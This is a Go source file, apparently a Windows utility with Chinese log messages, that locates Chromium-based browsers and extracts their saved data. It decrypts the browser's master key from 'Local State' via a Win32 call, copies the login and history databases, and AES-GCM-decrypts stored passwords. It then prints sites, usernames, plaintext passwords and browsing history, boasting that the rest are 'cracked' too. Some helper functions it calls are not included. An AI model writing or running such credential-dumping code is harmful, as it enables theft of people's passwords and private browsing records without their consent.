package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"

	"github.com/howeyc/gopass"
)

const (
	DEFAULT_LOCAL_STATE = `Local State`
)

var (
	logger = log.Default()
)

func init() {
	logger.SetFlags(log.Lmicroseconds)
}

func main() {
	logger.Println("请输入启动密码：")
	pass := false
	for !pass {
		if cliPsw, err := gopass.GetPasswdMasked(); err != nil {
			logger.Println("获取密码错误")
			waitAnyKeyAndQuite()
		} else if string(cliPsw) != "" {
			logger.Println("密码错误，请重试：")
		} else {
			pass = true
		}
	}

	findBrowser := false
	logger.Println("开始探测Chromium内核浏览器...")
	if browsers := ScanChromiumBrowser(); len(browsers) > 0 {
		findBrowser = true
		for k, bro := range browsers {
			if k > 0 {
				logger.Println("------------------")
			}
			logger.Printf("探测到%s浏览器，解密数据密钥...\n", bro.name)
			encKey := loadEncKey(bro.userPath)
			encKeyHex := hex.EncodeToString(encKey)
			logger.Printf("解密数据密钥完毕，密钥：%s********%s\n", encKeyHex[:8], encKeyHex[len(encKeyHex)-8:])
			logger.Println("加载用户数据库...")
			showSavedPass(bro.passwordPath, encKey, 5)
			showHistory(bro.historyPath, encKey, 5)
			logger.Println("提取数据完毕，清理临时文件...")
			logger.Println("清理临时文件完毕")
			if k+1 == len(browsers) {
				logger.Printf("%s浏览器数据处理完毕\n", bro.name)
			} else {
				logger.Printf("%s浏览器数据处理完毕\n\n", bro.name)
			}
		}
	}

	if !findBrowser {
		logger.Println("没有探测到任何支持的浏览器，退出")
		waitAnyKeyAndQuite()
	}

	waitAnyKeyAndQuite()
}

func waitAnyKeyAndQuite() {
	var ignore byte
	logger.Print("按任意键退出...")
	fmt.Scanf("%c", &ignore)
	// logger.Print("按任意键退出...")
	// b := make([]byte, 1)
	// os.Stdin.Read(b)
	os.Exit(1)
}

// loadEncKey 加载加密密钥
func loadEncKey(path string) []byte {
	lsBytes, err := os.ReadFile(path + DEFAULT_LOCAL_STATE)
	if err != nil {
		return nil
	}

	localStateObj := struct {
		OsCrypt struct {
			EncKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}{}
	if err = json.Unmarshal(lsBytes, &localStateObj); err != nil {
		logger.Printf("decode json data error:%v", err)
		waitAnyKeyAndQuite()
	}

	keyCipByte, err := base64.StdEncoding.DecodeString(localStateObj.OsCrypt.EncKey)
	if err != nil {
		logger.Printf("decode base64 data error:%v", err)
		waitAnyKeyAndQuite()
	}
	keyCipByte = keyCipByte[5:] // 去掉头部

	// 解密密钥
	keyPlaByte, err := Win32Decrypt(keyCipByte)
	if err != nil {
		logger.Printf("encryption key data decrypt error:%v", err)
		waitAnyKeyAndQuite()
	}
	return keyPlaByte
}

// showSavedPass 展示保存的密码
func showSavedPass(dbPath string, encKey []byte, count int) {
	fTmp, err := os.OpenFile("tmpL.db", os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		logger.Println("创建临时文件错误")
		waitAnyKeyAndQuite()
	}

	fDb, err := os.OpenFile(dbPath, os.O_RDONLY, os.ModePerm)
	if err != nil {
		fTmp.Close()
		logger.Println("读取用户密码数据库错误:" + err.Error())
		waitAnyKeyAndQuite()
	}

	if _, err = io.Copy(fTmp, fDb); err != nil {
		fDb.Close()
		fTmp.Close()
		logger.Println("加载用户密码数据库错误:" + err.Error())
		waitAnyKeyAndQuite()
	}
	fDb.Close()
	fTmp.Close()
	logger.Printf("加载用户密码数据库完毕")

	dbData, totalCount := fetchChromiumPswDataFromDb("./tmpL.db", count*5)
	if dbData == nil {
		waitAnyKeyAndQuite()
	}

	logger.Println("开始提取密码数据...\n")
	i := 0
	for _, item := range dbData {
		if i >= count {
			break
		}
		if (len(item.psw) * len(item.uname) * len(item.url)) == 0 {
			continue
		}
		i++

		// 解密密码
		iv := item.psw[3:15]
		cipData := item.psw[15:]
		plaData := aesGcmDecrypt(encKey, iv, cipData)
		pswStr := string(plaData)
		logger.Printf("数据:%d\n网址:%s\n用户名:%s\n密码:%s\n\n", i, item.url, item.uname, pswStr)
	}
	if totalCount > count {
		logger.Printf("其他还有%d条数据的用户名密码，也已被破解\n\n", totalCount-count)
	}
	os.Remove("tmpL.db")
}

// showHistory 展示浏览记录
func showHistory(dbPath string, encKey []byte, count int) {
	fTmp, err := os.OpenFile("tmpH.db", os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		logger.Println("创建临时文件错误")
		waitAnyKeyAndQuite()
	}

	fDb, err := os.OpenFile(dbPath, os.O_RDONLY, os.ModePerm)
	if err != nil {
		fTmp.Close()
		logger.Println("读取用户浏览历史数据库错误:" + err.Error())
		waitAnyKeyAndQuite()
	}

	if _, err = io.Copy(fTmp, fDb); err != nil {
		fDb.Close()
		fTmp.Close()
		logger.Println("加载用户浏览历史数据库错误:" + err.Error())
		waitAnyKeyAndQuite()
	}
	fDb.Close()
	fTmp.Close()
	logger.Printf("加载用户浏览历史数据库完毕")

	dbData, totalCount := fetchChromiumHistoryDataFromDb("./tmpH.db", count*5)
	if dbData == nil {
		waitAnyKeyAndQuite()
	}

	logger.Println("开始提取浏览历史数据...\n")
	i := 0
	for _, item := range dbData {
		if i >= count {
			break
		}
		// if (len(item.psw) * len(item.uname) * len(item.url)) == 0 {
		// 	continue
		// }
		i++

		logger.Printf("浏览历史:%d\n网址:%s\n标题:%s\n\n", i, item.url, item.uname)
	}
	if totalCount > count {
		logger.Printf("其他还有%d条数据的浏览历史记录\n\n", totalCount-count)
	}
	os.Remove("tmpH.db")
}

// aesGcmDecrypt GCM解密数据
func aesGcmDecrypt(aesKey, aesIv, cipherData []byte) []byte {
	blocker, err := aes.NewCipher(aesKey)
	if err != nil {
		logger.Fatalln("加载数据密钥错误," + err.Error())
	}
	aead, err := cipher.NewGCM(blocker)
	if err != nil {
		logger.Fatalln("加载数据密钥参数错误," + err.Error())
	}

	res, err := aead.Open(nil, aesIv, cipherData, nil)
	if err != nil {
		logger.Println("解密数据错误," + err.Error())
		res = []byte("nil")
	}

	return res
}
